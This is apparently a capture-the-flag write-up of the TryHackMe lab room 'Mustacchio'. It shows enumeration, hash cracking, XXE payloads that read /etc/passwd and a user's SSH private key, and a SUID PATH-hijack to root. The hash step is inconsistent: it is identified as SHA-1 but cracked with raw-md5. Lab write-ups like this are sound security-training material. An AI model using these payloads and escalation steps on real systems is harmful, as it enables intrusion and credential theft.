---
title: Mustacchio
description: Writeup of the TryHackMe room Mustacchio
date: 2024-10-21 00:00:00 +0000
categories: [THM, Writeup]
tags: [ctf, linux, web, thm, writeup, ghidra, burpsuite, gobuster, nmap, ssh, john, sqlite, xxe, suid]
pin: True
math: true
mermaid: true
comments: true
media_subpath: /images/Mustacchio
img_path: /images/Mustacchio
image:
  path: mustacchio.jpg
---

 This is a walkthrough of the TryHackMe room Mustacchio. The room is rated as easy and is a beginner-friendly room. The room is about a web application that has a vulnerability that allows us to exploit the machine. The room is a great way to learn about XXE vulnerabilities and how to exploit them.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Objectives: Find the user and root flags
{: .prompt-info }
> Useful Tools: `Nmap`, `Gobuster`, `BurpSuite`, `John`, `SQLite3`, `SSH`, `Ghidra`
{: .prompt-tip }
<!-- markdownlint-restore -->

## Enumeration/Reconnaissance  
  
Let's start with a simple nmap scan to see what ports are open on the machine.  

```console
sudo nmap -sC -sV --min-rate=9936 -T4 <Target IP>
```
### NMAP Results
![Screenshot](Screenshot_1.png){: width="972" height="589" }

The scan shows that the machine has two ports open, port 22 and port 80. Port 80 is running a web server, so we will check that out first. There is one disallowed entry in the `robots.txt`{: .filepath} file, which will likely be the next step.

### Visiting the Page
![Screenshot](Screenshot_2.png){: width="972" height="589" }

The `robots.txt`{: .filepath} file contained nothing of interest, so we will run a `Gobuster` scan to find any hidden directories, and manually check out the rest of the site while we wait for the scan to finish. The syntax for the `Gobuster` scan is as follows:

```console
gobuster dir -u <Target IP> -w /usr/share/wordlists/dirb/big.txt -t 150 -x php,html,txt
```
>This syntax will scan the target IP with the `big.txt`{: .filepath} wordlist, using 150 threads to speed up the scan, and looking for files with the extensions `php`, `html`, and `txt`. 
{: .prompt-tip }

### GoBuster Results
![Screenshot](Screenshot_3.png){: width="972" height="589" }

## Users.bak
![Screenshot](Screenshot_4.png){: width="972" height="589" }

Downloading the file and determining the file type showed that it is an `SQLite 3.x` database file. We can use `SQLite3` to view the contents of the file, and possibly find some credentials. Dumping the database into a file 'output.txt'{: .filepath} and viewing the contents shows that there are credentials for the admin and a hashed password. We just need to crack the password and find somewhere to use the credentials.

![Screenshot](Screenshot_6.png){: width="972" height="589" }

### Cracking the Hash
Saving the username and hashed password to `admin.hsh`{: .filepath} and checking the hash type with `Hash-identifier` shows that the hash is a SHA-1 hash. 

![Screenshot](Screenshot_7.png){: width="972" height="589" }

We can use `John` to crack the password. I will be using the infamous `rockyou.txt`{: .filepath} to crack the hash. The syntax for this is as follows:

```console
john --wordlist=<wordlist> --format=raw-md5 admin.hsh
```
![Screenshot](Screenshot_8.png){: width="972" height="589" }
_The hash was cracked and the password is 'bulldog19'_

I will save this to my notes and move on to the next step.

## Logging In

Further investigation of the site was fruitless. Before whipping out `BurpSuite`, let's try running another `NMAP` scan to see if there are any other ports open that we missed. 

```console
nmap -p- -T4 --min-rate=9936 <Target IP>
```
![Screenshot](Screenshot_9.png){: width="972" height="589" }

We find another port open, 8765 with a service called 'ultraseek-http'. Here we have a login page. Trying the credentials we found earlier, we are able to log in and look around.

![Screenshot](Screenshot_10.png){: width="972" height="589" }

Once logged in, all the page displays is a simple text box where we can add comments to the website. It looks like we are going to have to inject some code into the comments. I want to check out a couple more things before I begin attempting to exploit this feature.

### Looking Deeper
![Screenshot](Screenshot_11.png){: width="972" height="589" }

Looking at the source code of the page, there is a comments that says "Barry, you can now SSH in using your key!" Barry could be a possible username to try, but it looks like `SSH` doesn't support password authentication. We will have to find Barry's private key to `SSH` in as him.

![Screenshot](Screenshot_12.png){: width="972" height="589" }

I am also going to run another `Gobuster` scan to see if there are any hidden directories on the `ultraseek-http`{: .filepath} service. I will run the same command as before, this time specifying the new port:

```console
gobuster dir -u <Target IP>:8765 -w /usr/share/wordlists/dirb/big.txt -t 150 -x php,html,txt
```
![Screenshot](Screenshot_13.png){: width="972" height="589" }

There are two interesting directories to check out, `/assets`{: .filepath} and `/auth`{: .filepath}. Unfortunately, we can't access anything here (yet). 

## Exploitation
### Finding a Vulnerability

Next, I want to test the comments feature to see if we can inject code into the comments. I first upload a simple test comment to see how the page handles it. 

![Screenshot](Screenshot_14.png){: width="972" height="589" }
![Screenshot](Screenshot_15.png){: width="972" height="589" }

We have an alert telling us to insert `XML` code. This is a good sign that we can inject code into the comments. Using `BurpSuite` to intercept the request, I inspected the request and response from the server, and found an interesting file referenced in the response. 
![Screenshot](Screenshot_16.png){: width="972" height="589" }

Downloading this contains another `.bak`{: .filepath} file called `dontforget`{: .filepath}. This may be another `SQLite` database file containing more credentials. Let's use the same process we used before to extract the credentials from the file. However, upon inspecting the file, we find that it is just a useless text file... or is it?

Inputting the content of the file into the Admin Panel we found earluier, we can see that the message is now displayed on the admin page. It looks like the target might be weak to an `XXE` attack. Let's test a line of `XML` code to see if we can check for the vulnerability:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&example;</com>
</comment>
```

![Screenshot](Screenshot_17.png){: width="300" height="300" .left}

And it worked! We now know that we can inject `XML` code into the comments. This occurs when an application processes `XML` input containing a reference to an external entity. If the `XML` parser is configured insecurely, it can allow an attacker to exploit this reference to access internal files or resources, leading to sensitive data exposure, or hopefully remote code execution!  
<br>

### Exploiting the Vulnerability
Lets try to read the `/etc/passwd`{: .filepath} file using the following XML code:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&test;</com>
</comment>
```
This works and we can now see the contents of the `/etc/passwd`{: .filepath} file displayed on the page. I will take not of the credentials and move on.
![Screenshot](Screenshot_18.png){: width="972" height="589" }

As stated earlier, password authentication is disabled for `SSH`, so we will need a key to `SSH` in as Barry. We can use the same method to read the `/home/barry/.ssh/id_rsa` file to get the private key. I will use `BurpSuite` to resend the earlier request with the altered request, or alternatively, input directly to the site to read the file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 	
'file:///home/barry/.ssh/id_rsa'> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&test;</com>
</comment>
```
### SSH Access and User Flag

![Screenshot](Screenshot_19.png){: width="972" height="589" }

This works and we now just have to decrypt the key and `SSH` in as Barry. We will have to use `ssh2john` to convert the key to a format that `John` can crack. The syntax for this is as follows:

```console
ssh2john id_rsa > id_rsa.hsh
john id_rsa.hsh --wordlist=<wordlist> 
```

The passkey was found successfully, now we can `SSH` in as Barry. 
![Screenshot](Screenshot_20.png){: width="972" height="589" }

Make sure to change the permissions of the key to 600 (rw-) before attempting to `SSH` in. Remove any extra spaces in the key, this could cause the key not to be accepted. 

```console
ssh -i id_rsa barry@<Target IP>
```
![Screenshot](Screenshot_21.png){: width="972" height="589" }

We are now logged in as Barry, let's grab the user flag and move on to privilege escalation.

![Screenshot](Screenshot_22.png){: width="972" height="589" }


## Privilege Escalation

I'll start by running a simple command to check for any privilege escalation opportunities. 

```console
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
![Screenshot](Screenshot_23.png){: width="972" height="589" }

What stands out here is `/home/joe/live_log`{: .filepath}. This is a binary that is owned by root and has the SUID bit set. This means that we can run it, and it will run with root privileges. Let's extract this back to our machine and analyze it further.

This can be done using `SCP`. The syntax for this case:

```console
scp -i id_rsa barry@<Target IP>:/home/joe/live_log .
```

### Analyzing /live_log

With the binary on our machine, I will use `Ghirdra` to analyze the it. Upon analyzing the strings, there is a string that says "tail -f /var/log/nginx/access.log". This can be exploited could potentially be exploited by altering `tail` and placing it in the path.

![Screenshot](Screenshot_24.png){: width="972" height="589" }


## Success: Root Flag
Back in the `SSH` session, let's try to exploit this. We can "create" our own `tail`, add it to the path, and then run `/live_log`{: .filepath}. This should allow us to become root. Running the following commands in the `/tmp`{: .filepath} will set up our `tail`, and then add `/tmp`{: .filepath} to the path.

```console
echo '/bin/bash' > tail
chmod 777 tail
export PATH=/tmp:$PATH
``` 

Now we can execute the file and check our privileges. 
![Screenshot](Screenshot_25.png){: width="972" height="589" }

We are now root and can grab the root flag.
![Screenshot](Screenshot_27.png){: width="972" height="589" }

# Conclusion
While rated as easy, this was a great room to practice finding web application vulnerabilities and exploit them. This challenge was the first time I exploited the main vulnerability in this room, so learning how to check for and exploit XXE was very interesting. I used PayloadsAllTheThings[^1], which is an amazing resource that can help you with all kinds of web exploits. I hope you found this walkthrough helpful and informative. Thank you for reading! 

### Useful Resources

[^1]: Source: [PayloadsAllTheThings GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings)
